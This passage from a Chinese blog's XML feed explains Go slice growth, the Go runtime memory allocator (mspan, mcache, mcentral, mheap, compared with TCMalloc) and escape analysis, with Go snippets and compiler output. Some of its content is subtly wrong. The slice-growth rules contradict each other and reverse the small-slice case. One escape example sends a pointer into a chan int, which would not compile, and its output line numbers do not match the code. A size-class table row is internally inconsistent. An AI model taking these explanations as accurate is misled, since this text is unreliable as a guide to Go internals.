title="slice扩容策略"></a>slice扩容策略</h4><ol><li>每次扩容会使得新的容量变为原来的2倍(cap*2);</li><li>如果当前slice的容量小于1024, 则每次扩容时新容量会变为原来的1.25倍(cap*1.25)。这种情况下, 对于小型slice, 扩容增长速度会慢一些, 以节省空间;</li><li>如果slice的长度小于1024, 则新的容量会按照上述规则进行计算。否则, 新的容量会增加与当前slice长度的一半;</li></ol><p>当slice进行扩容时, Go语言会进行以下操作:</p><ul><li>分配一个新的底层数组, 并将原有的元素拷贝到新数组中;</li><li>将slice的指针指向新的底层数组, 同时更新slice的长度和容量;</li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang内存管理</title>
      <link href="/e2894e3d.html"/>
      <url>/e2894e3d.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>Golang内存分配机制</strong></p><p>Go语言内置运行时(就是runtime), 抛弃了传统的内存分配方式, 改为自主管理。这样可以自主实现更好的内存使用模式, 比如内存池、预分配等等。这样, 不会每次内存分配都需要系统调用;</p></div><span id="more"></span><h2 id="设计思想"><a href="#设计思想" class="headerlink" title="设计思想"></a>设计思想</h2><ul><li>内存分配算法采用Google的<code>TCMalloc</code>算法, 每个线程都会自行维护一个独立的内存池, 进行内存分配时优先从该内存池中分配, 当内存池不足时才会向加锁的全局内存池申请, 减少系统调用并且避免不同线程对全局内存池的锁竞争;</li><li>把内存切分的非常细小, 分为多级管理, 以降低锁的粒度;</li><li>回收对象时, 并没有将其真正释放, 只是放回预先分配的大块内存中, 以便复用。只有内存闲置过多的时候, 才会尝试归还部分内存给操作系统, 降低整体开销;</li></ul><h2 id="分配组件"><a href="#分配组件" class="headerlink" title="分配组件"></a>分配组件</h2><blockquote><p>Go的内存管理组件主要有: <code>mspan</code>、<code>mcache</code>、<code>mcentral</code>和<code>mheap</code>;</p></blockquote><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/Golang%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6.png' data-fancybox='default' data-caption='内存分配'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/Golang%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/Golang%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="内存分配"></a><span class='image-caption'>内存分配</span></div></div><h3 id="内存管理单元-mspan"><a href="#内存管理单元-mspan" class="headerlink" title="内存管理单元: mspan"></a>内存管理单元: mspan</h3><p><code>mspan</code>是内存管理的基本单元, 该结构体中包含<code>next</code>和<code>prev</code>两个字段, 它们分别指向前一个和后一个<code>mspan</code>, 每个<code>mspan</code>都管理<code>npages</code>个大小为8kb的页, 一个span是由多个page组成, 这里的页不是操作系统中的内存页, 它们是操作系统内存页的整数倍;</p><p><code>page</code>是内存存储的基本单元, “对象”放到<code>page</code>中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> mspan <span class="keyword">struct</span> &#123;</span><br><span class="line">    next        *mspan          <span class="comment">// 前指针</span></span><br><span class="line">    prev        *mspan          <span class="comment">// 后指针</span></span><br><span class="line">    startAddr   <span class="type">uintptr</span>         <span class="comment">// 管理页的起始地址, 指向page</span></span><br><span class="line">    npages      <span class="type">uintptr</span>         <span class="comment">// 页数</span></span><br><span class="line">    spanclass   spanClass       <span class="comment">// 规格</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> spanClass <span class="type">uint8</span></span><br></pre></td></tr></table></figure><p>Go有68种不同大小的spanClass, 用于小对象分配</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _NumSizeClasses = <span class="number">68</span></span><br><span class="line"><span class="keyword">var</span> class_to_size = [_NumSizeClasses]<span class="type">uint16</span>&#123;<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">64</span>, <span class="number">80</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">144</span>, <span class="number">160</span>, <span class="number">176</span>, <span class="number">192</span>, <span class="number">208</span>, <span class="number">224</span>, <span class="number">240</span>, <span class="number">256</span>, <span class="number">288</span>, <span class="number">320</span>, <span class="number">352</span>, <span class="number">384</span>, <span class="number">416</span>, <span class="number">448</span>, <span class="number">480</span>, <span class="number">512</span>, <span class="number">576</span>, <span class="number">640</span>, <span class="number">704</span>, <span class="number">768</span>, <span class="number">896</span>, <span class="number">1024</span>, <span class="number">1152</span>, <span class="number">1280</span>, <span class="number">1408</span>, <span class="number">1536</span>,<span class="number">1792</span>, <span class="number">2048</span>, <span class="number">2304</span>, <span class="number">2688</span>, <span class="number">3072</span>, <span class="number">3200</span>, <span class="number">3456</span>, <span class="number">4096</span>, <span class="number">4864</span>, <span class="number">5376</span>, <span class="number">6144</span>, <span class="number">6528</span>, <span class="number">6784</span>, <span class="number">6912</span>, <span class="number">8192</span>, <span class="number">9472</span>, <span class="number">9728</span>, <span class="number">10240</span>, <span class="number">10880</span>, <span class="number">12288</span>, <span class="number">13568</span>, <span class="number">14336</span>, <span class="number">16384</span>, <span class="number">18432</span>, <span class="number">19072</span>, <span class="number">20480</span>, <span class="number">21760</span>, <span class="number">24576</span>, <span class="number">27264</span>, <span class="number">28672</span>, <span class="number">32768</span>&#125;</span><br></pre></td></tr></table></figure><p>如果按照序号为1的spanClass(对象规格为8B)分配, 每个span占用堆的字节数: 8k, mspan可以保存1024个对象;<br>如果按照序号为2的spanClass(对象规格为16B)分配, 每个span占用堆的字节数: 8k, mspan可以保存512个对象;<br>…<br>如果按照序号为67的spanClass(对象规格为32K)分配, 每个span占用堆的字节数: 32k, mspan可以保存1个对象;</p><table><thead><tr><th align="right">class</th><th align="right">bytes&#x2F;obj</th><th align="right">bytes&#x2F;span</th><th align="right">objects</th><th align="right">tail waste</th><th align="right">max waste</th></tr></thead><tbody><tr><td align="right">1</td><td align="right">8</td><td align="right">8192</td><td align="right">1024</td><td align="right">0</td><td align="right">87.50%</td></tr><tr><td align="right">2</td><td align="right">16</td><td align="right">8192</td><td align="right">512</td><td align="right">0</td><td align="right">43.75%</td></tr><tr><td align="right">3</td><td align="right">24</td><td align="right">8192</td><td align="right">341</td><td align="right">0</td><td align="right">29.24%</td></tr><tr><td align="right">4</td><td align="right">32</td><td align="right">8192</td><td align="right">256</td><td align="right">0</td><td align="right">46.88%</td></tr><tr><td align="right">5</td><td align="right">48</td><td align="right">8192</td><td align="right">170</td><td align="right">32</td><td align="right">31.52%</td></tr><tr><td align="right">6</td><td align="right">64</td><td align="right">8192</td><td align="right">128</td><td align="right">0</td><td align="right">23.44%</td></tr><tr><td align="right">7</td><td align="right">80</td><td align="right">8192</td><td align="right">102</td><td align="right">32</td><td align="right">19.07%</td></tr><tr><td align="right">…</td><td align="right">…</td><td align="right">…</td><td align="right">…</td><td align="right">…</td><td align="right">…</td></tr><tr><td align="right">67</td><td align="right">32768</td><td align="right">8192</td><td align="right">1</td><td align="right">0</td><td align="right">12.50%</td></tr></tbody></table><p>字段含义:</p><ul><li>class: class ID, 每个span结构种都有一个class ID, 表示该span可处理的对象类型;</li><li>bytes&#x2F;obj: 该class代表对象的字节数;</li><li>bytes&#x2F;span: 每个span占用堆的字节数, 也即页数*页大小;</li><li>objects: 每个span可分配的对象个数, 也即(bytes&#x2F;spans) &#x2F; (bytes&#x2F;obj);</li><li>waste bytes: 每个span产生的内存碎片, 也即(bytes&#x2F;spans) % (bytes&#x2F;obj)</li></ul><blockquote><p>大于32k的对象出现时, 会直接从heap分配一个特殊的span, 这个特殊的span的类型(class)是0, 只包含了一个大对象;</p></blockquote><h3 id="线程缓存-mcache"><a href="#线程缓存-mcache" class="headerlink" title="线程缓存: mcache"></a>线程缓存: mcache</h3><p><code>mcache</code>管理线程在本地缓存的mspan, 每个goroutine绑定的P都有一个mcache字段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> mcache <span class="keyword">struct</span> &#123;</span><br><span class="line">    alloc [numSpanClasses]*mspan</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_NumSizeClasses = <span class="number">68</span></span><br><span class="line">numSpanClasses = _NumSizeClasses &lt;&lt; <span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>mcache</code>和<code>Span Classes</code>作为索引管理多个用于分配的mspan, 它包含所有规格的<code>mspan</code>。它是<code>_NumSizeClasses</code>的2倍, 也就是<code>68*2=136</code>, 其中<code>*2</code>是将spanClass分成了有指针和没有指针两种, 方便于垃圾回收。对于每种规格, 有2个mspan, 一个不包含指针, 另一个则包含指针。对于无指针对象的<code>mspan</code>在进行垃圾回收时无需进一步扫描它是否引用了其他活跃的对象。</p><p><code>mcache</code>在初始化的时候是没有任何<code>mspan</code>资源的, 在使用过程种会动态地从<code>mcentral</code>申请, 之后会缓存下来。当对象小于等于32KB时, 使用<code>mcache</code>的相应规格的<code>mspan</code>进行分配。</p><h3 id="中心缓存-mcentral"><a href="#中心缓存-mcentral" class="headerlink" title="中心缓存: mcentral"></a>中心缓存: mcentral</h3><p><code>mcentral</code>管理全局的<code>mspan</code>供所有线程使用, 全局<code>mheap</code>变量包含<code>central</code>字段, 每个<code>mcentral</code>结构都维护在<code>mheap</code>结构内;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> mcentral <span class="keyword">struct</span> &#123;</span><br><span class="line">    spanClass spanClass     <span class="comment">// 指当前规格大小</span></span><br><span class="line"></span><br><span class="line">    partial [<span class="number">2</span>]spanSet      <span class="comment">// 有空闲object的mspan列表</span></span><br><span class="line">    full    [<span class="number">2</span>]spanSet      <span class="comment">// 没有空闲object的mspan列表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个<code>mcentral</code>管理一种<code>spanClass</code>的<code>span</code>, 并将有空闲空间和没有空闲空间的<code>mspan</code>分开管理。<code>partail</code>和<code>full</code>的数据类型为<code>spanSet</code>, 表示<code>mspans</code>集, 可用通过<code>pop</code>、<code>push</code>来获得<code>mspans</code>;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> spanSet <span class="keyword">struct</span> &#123;</span><br><span class="line">    spineLock   mutex</span><br><span class="line">    spine       unsafe.Pointer      <span class="comment">// 指向[]span指针</span></span><br><span class="line">    spineLen    <span class="type">uintptr</span>             <span class="comment">// Spine array length, accessed atomically</span></span><br><span class="line">    spineCap    <span class="type">uintptr</span>             <span class="comment">// Spine array cap, accessed under lock</span></span><br><span class="line"></span><br><span class="line">    index       headTailIndex       <span class="comment">// 前32位是头指针, 后32位是尾指针      </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单说下<code>mcache</code>从<code>mcentral</code>获取和归还<code>mspan</code>的流程:</p><ul><li>获取: 加锁, 从<code>partail</code>链表找到一个可用的<code>mspan</code>; 并将其从<code>partail</code>链表删除; 将取出的<code>mspan</code>加入到<code>full</code>链表中; 将<code>mspan</code>返回给工作流程, 解锁;</li><li>归还: 加锁, 将<code>mspan</code>从<code>full</code>链表中删除, 将<code>mspan</code>加入到<code>partail</code>链表中, 解锁;</li></ul><h3 id="页堆-mheap"><a href="#页堆-mheap" class="headerlink" title="页堆: mheap"></a>页堆: mheap</h3><p><code>mheap</code>管理Go所有动态分配内存, 可以认为是Go程序持有整个堆空间, 全局唯一;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mheap_ mheap</span><br><span class="line"><span class="keyword">type</span> mheap <span class="keyword">struct</span> &#123;</span><br><span class="line">    lock        mutex           <span class="comment">// 全局锁</span></span><br><span class="line">    pages       pageAlloc       <span class="comment">// 页面分配的数据结构</span></span><br><span class="line">    allspans    []*mspan        <span class="comment">// 所有通过mheap_申请的mspans</span></span><br><span class="line">    <span class="comment">//堆</span></span><br><span class="line">    arenas      [<span class="number">1</span> &lt;&lt; arenas1Bits]*[<span class="number">1</span> &lt;&lt; arenas2Bits]*heapArena</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有中心缓存mcentral</span></span><br><span class="line">    central     [numSpanClasses]<span class="keyword">struct</span> &#123;</span><br><span class="line">        mcentral    mcentral</span><br><span class="line">        pad         [cpu.CacheLinePadSize - unsafe.Sizeof(mcentral&#123;&#125;) % cpu.CacheLinePadSize]<span class="type">byte</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有<code>mcentral</code>的集合则是存放于<code>mheap</code>中的。<code>mheap</code>里的<code>arena</code>区域是堆内存的抽象, 运行时会将<code>8KB</code>看做一页, 这些内存页存储了所有在堆上初始化的对象。运行时使用二维的<code>runtime.heapArena</code>数组管理所有的内存, 每个<code>runtime.heapArena</code>都会管理64MB的内存;</p><p>当申请内存时, 依次经过<code>mcache</code>和<code>mcentral</code>都没有可用合适规格的大小内存, 这时候会向<code>mheap</code>申请一块内存。然后按指定规格划分为一些列表, 并将其添加到相同规格大小的<code>mcentral</code>的<code>非空闲列表</code>后面;</p><h2 id="分配对象"><a href="#分配对象" class="headerlink" title="分配对象"></a>分配对象</h2><ul><li>微对象(0, 16B): 先使用线程缓存上的微型分配器, 再依次尝试线程缓存、中心缓存、堆 分配内存;</li><li>小对象(16B, 32KB): 一次尝试线程缓存、中心缓存、堆 分配内存;</li><li>大对象(32KB, +∞): 直接尝试堆分配内存;</li></ul><h2 id="分配流程"><a href="#分配流程" class="headerlink" title="分配流程"></a>分配流程</h2><ul><li>首先通过计算使用的大小规格;</li><li>然后使用<code>mcache</code>中对应大小规格的块分配;</li><li>如果<code>mcentral</code>中没有可用的块, 则向<code>mheap</code>申请, 并根据算法找到最合适的<code>mspan</code>;</li><li>如果申请到的<code>mspan</code>超出申请大小, 将会根据需求进行切分, 以返回用户所需的页数, 剩余的页构成一个新的<code>mspan</code>放回<code>mheap</code>的空闲列表中;</li><li>如果<code>mheap</code>中没有可用的<code>span</code>, 则向操作系统申请一系列新的页(最小1MB);</li></ul><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202403252108652.png' data-fancybox='default' data-caption='Golang内存分配流程'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202403252108652.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202403252108652.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Golang内存分配流程"></a><span class='image-caption'>Golang内存分配流程</span></div></div><h1 id="Golang内存管理-其二"><a href="#Golang内存管理-其二" class="headerlink" title="Golang内存管理-其二"></a>Golang内存管理-其二</h1><h2 id="TCMalloc"><a href="#TCMalloc" class="headerlink" title="TCMalloc"></a>TCMalloc</h2><blockquote><p>go内存管理是借鉴了<code>TCMalloc</code>的设计思想, <code>TCMalloc</code>全称<code>Thread-Caching Malloc</code>, 是Google开发的内存分配器。</p></blockquote><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202404152309649.png' data-fancybox='default' data-caption='TCMalloc'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202404152309649.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202404152309649.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="TCMalloc"></a><span class='image-caption'>TCMalloc</span></div></div><h3 id="Page"><a href="#Page" class="headerlink" title="Page"></a>Page</h3><p>操作系统对内存管理以页为单位, TCMalloc也是这样, 只不过TCMalloc里的Page大小与操作系统大小并不一定相等, 而是倍数关系;</p><h3 id="Span"><a href="#Span" class="headerlink" title="Span"></a>Span</h3><p>一组连续的Page被称为Span, 比如可以有4个页大小的Sapn, 也可以有8个页大小的Span, Span比Page高一个层级, 是为了方便管理一定大小的内存区域, Span是TCMalloc中内存管理的基本单位;</p><h3 id="ThreadCache"><a href="#ThreadCache" class="headerlink" title="ThreadCache"></a>ThreadCache</h3><p>每个线程各自的Cache, 一个Cache包含多个空闲内存块链表, 每个链表连接的都是内存块, 同一个链表上的内存块的大小是相同的, 也可以说按内存块大小给内存块分了个类, 这样可以根据申请的内存大小, 快速从合适的链表选择空闲内存块, 由于每个线程有自己的ThreadCache, 所以ThreadCache访问是无锁的;</p><h3 id="CentalCache"><a href="#CentalCache" class="headerlink" title="CentalCache"></a>CentalCache</h3><p>是所有线程共享的缓存, 也是保存的空闲内存块链表, 链表的数量与ThreadCache中链表数量相同, 当ThreadCache内存块不足时, 可以从CentralCache中取; 当ThreadCache内存块多时, 可以放回CentralCache中; 由于CentralCache是共享的, 所有它的访问是要加锁的;</p><h3 id="PageHeap"><a href="#PageHeap" class="headerlink" title="PageHeap"></a>PageHeap</h3><p>PageHeap是堆内存的抽象, PageHeap存的也是若干链表, 链表保存的是Span, 当CentralCache没有内存时, 会从PageHeap中取, 把1个Span拆成若干内存块, 添加到对应大小的链表中, 当CentralCache内存多的时候, 会放回PageHeap中;</p><h3 id="TCMalloc对象分配"><a href="#TCMalloc对象分配" class="headerlink" title="TCMalloc对象分配"></a>TCMalloc对象分配</h3><p>小对象直接从ThreadCache中分配, 若ThreadCache不够则从CentralCache中获取内存, CentralCache内存不够时再从PageHeap中获取内存, 大对象在PageHeap中选择合适的页组成Span用于存储数据;</p><h2 id="Go内存管理"><a href="#Go内存管理" class="headerlink" title="Go内存管理"></a>Go内存管理</h2><p>经过上述对TCMalloc内存管理的描述, 接着看一下Go内存管理架构图</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202404162245658.png' data-fancybox='default' data-caption='Go内存管理'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202404162245658.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202404162245658.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Go内存管理"></a><span class='image-caption'>Go内存管理</span></div></div><h3 id="Page-1"><a href="#Page-1" class="headerlink" title="Page"></a>Page</h3><p>和TCMalloc中的Page相同, 图中最下方浅蓝色长方形代表一个Page;</p><h3 id="Span-1"><a href="#Span-1" class="headerlink" title="Span"></a>Span</h3><p>与TCMalloc中的Span相同, Span是go内存管理的基本单元, 代码中为mspan, 一组连续的Page组成1个Span, 所以上图一组连续的浅蓝色长方形代表的是一组Page组成的1个Span, 另外, 1个淡紫色长方形为1个Span;</p><h3 id="mcache"><a href="#mcache" class="headerlink" title="mcache"></a>mcache</h3><p>mcache与TCMalloc中的ThreadCache类似, mcache保存的是各种大小的Span, 并按Span class分类, 小对象直接从mcache分配内存, 它起到了缓存的作用, 并且可以无锁访问。但mcache与ThreadCache也有不同点, TCMalloc中是每个线程1个ThreadCache, Go中是每个P拥有1个mcache, 因为在Go程序中, 当前最多有GOMAXPROC个线程运行, 所以最多需要GOMAXPROCS个mcache就可以保证各线程对mache的无锁访问, 下图是G, P, M三者之间的关系:</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202404162241666.png' data-fancybox='default' data-caption='GMP模型'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202404162241666.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202404162241666.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="GMP模型"></a><span class='image-caption'>GMP模型</span></div></div><h3 id="mcentral"><a href="#mcentral" class="headerlink" title="mcentral"></a>mcentral</h3><p>mcentral与TCMalloc中的CentralCache类似, 是所有线程共享的缓存, 需要加锁访问, 它按Span class对Span分类, 串联成链表, 当mcache的某个级别Span的内存被分配光时, 它会向mcentral申请1个当前级别的Span。但mcentral与CentralCache也有不同点, CentralCache是每个级别的Span有1个链表, mcache是给个级别的Span有2个链表;</p><h3 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h3><p>mheap与TCMalloc中的PageHeap类似, 它是堆内存的抽象, 把从OS（系统）申请出的内存页组织成Span, 并保存起来。当mcentral的Span不够用时会向mheap申请, mheap的Span不够用时会向OS申请, 向OS的内存申请是按页来的, 然后把申请来的内存页生成Span组织起来, 同样也是需要加锁访问的。但mheap与PageHeap也有不同点: mhep把Span组织成了树结构, 而不是链表, 并且还是两棵树, 然后把Span分配到heapArena进行管理, 它包含地址映射和Span是否包含指针等位图, 这样做的主要原因是为了更高效的利用内存: 分配、回收和再利用;</p><h2 id="学习参考资料"><a href="#学习参考资料" class="headerlink" title="学习参考资料"></a>学习参考资料</h2><div class="btns rounded wide grid5">            <a class="button" href='https://vip.golangroadmap.com/question_bank/golang.html#%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95' title='GOLANG ROADMAP · 知识星球'><img src='https://image-1302243118.cos.ap-beijing.myqcloud.com/public/img/BLUE_GLASSES_GOPHER-1616727843503.png'>GOLANG ROADMAP · 知识星球</a><a class="button" href='https://cloud.tencent.com/developer/article/2051585' title='腾讯云开发者'><img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS3cQFDa8wIr-laiuPcBuId2HjBRN47HYZWOFO9jxxvEg&s'>腾讯云开发者</a>          </div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang内存逃逸</title>
      <link href="/b731d75e.html"/>
      <url>/b731d75e.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>什么是内存逃逸</strong></p><p>在程序中, 每个函数块都会有自己的内存区域来存自己的局部变量(内存占用少)、返回地址、返回值之类的数据, 这一块内存区域有特定的结构和寻址方式, 寻址起来十分迅速, 开销很少。这一块内存地址称为栈, 栈是线级别的, 大小在创建的时候已经确定, 当变量太大的时候, 会”逃逸”到堆上, 这种现象称为内存逃逸, 简单来说, 局部变量通过堆分配和回收, 就叫内存逃逸。</p></div><span id="more"></span><h2 id="内存逃逸的危害"><a href="#内存逃逸的危害" class="headerlink" title="内存逃逸的危害"></a>内存逃逸的危害</h2><blockquote><p>堆是一块没有特定结构, 也没有固定大小的内存区域, 可以根据需要进行调整。全局变量, 占用较大的局部变量, 函数调用结束后不能立刻回收的局部变量就会存在堆里面。变量在堆上的分配和回收都比在栈上开销大的多。对于go这种带GC的语言来说, 会增加GC压力, 同时容易造成内存碎片。</p></blockquote><h2 id="如何分析程序是否发生内存逃逸"><a href="#如何分析程序是否发生内存逃逸" class="headerlink" title="如何分析程序是否发生内存逃逸"></a>如何分析程序是否发生内存逃逸</h2><blockquote><p>build时添加<code>-gcflags=&quot;-m&quot;</code>选项可分析内存逃逸情况。比如输出<code>./main.go:3:6: moved to heap: x</code>表示局部变量x逃逸到了堆上。</p></blockquote><h2 id="内存逃逸发生时机"><a href="#内存逃逸发生时机" class="headerlink" title="内存逃逸发生时机"></a>内存逃逸发生时机</h2><h3 id="1-向channel发送指针数据"><a href="#1-向channel发送指针数据" class="headerlink" title="1. 向channel发送指针数据"></a>1. 向<code>channel</code>发送指针数据</h3><blockquote><p>因为在编译时, 不知道channel中的数据会被哪个goroutine接收, 因此编译器没法知道变量什么时候会被释放, 因此只能放到堆中;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">    x := <span class="number">5</span></span><br><span class="line">    ch &lt;- <span class="number">5</span>         <span class="comment">// x不发生逃逸, 因为只是复制值</span></span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">    y := <span class="number">5</span></span><br><span class="line">    py := &amp;y</span><br><span class="line">    ch1 &lt;- py       <span class="comment">// y逃逸, 因为y地址传入chan中, 编译时无法确定什么时候会被接收, 所以无法在函数返回后回收y</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"># command-line-arguments</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">5</span>:<span class="number">6</span>: can inline main</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">16</span>:<span class="number">2</span>: moved to heap: y</span><br></pre></td></tr></table></figure><h3 id="2-局部变量在函数调用结束后还被其他地方使用"><a href="#2-局部变量在函数调用结束后还被其他地方使用" class="headerlink" title="2. 局部变量在函数调用结束后还被其他地方使用"></a>2. 局部变量在函数调用结束后还被其他地方使用</h3><blockquote><p>局部变量在函数调用结束后还被其他地方使用, 比如函数返回局部变量指针或闭包中引用包外的值。因为变量的生命周期可能会超过函数周期, 因此只能放入堆中;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="number">5</span>              <span class="comment">// x发生逃逸, 因为在foo调用完成后, 被闭包函数用到, 还不能回收, 只能放到堆上存放</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    inner := foo()</span><br><span class="line">    inner()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"># command-line-arguments</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">5</span>:<span 